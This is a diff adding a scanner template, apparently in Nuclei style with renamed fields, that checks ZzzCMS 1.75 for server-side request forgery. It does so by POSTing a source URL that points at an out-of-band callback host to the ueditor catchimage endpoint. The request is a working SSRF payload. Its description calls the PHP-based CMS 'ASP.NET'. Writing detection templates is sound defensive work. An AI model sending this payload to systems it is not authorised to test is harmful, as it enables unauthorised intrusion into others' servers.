@@ -1,0 +1,33 @@
+id: zzzcms-ssrf
+brief:
+    title: ZzzCMS 1.75 - Server-Side Request Forgery
+    by: ritikchaddha
+    level: high
+    about: ZzzCMS (A Lightweight ASP.NET content management system) is vulnerable to SSRF(Server-Side Request Forgery).
+    label:
+        - zzzcms
+        - ssrf
+        - oast
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/plugins/ueditor/php/controller.php?action=catchimage&upfolder=1'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: source[0]=http://{{interactsh-url}}/{{filename}}.txt
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - '{"state":'
+            - 'list":'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
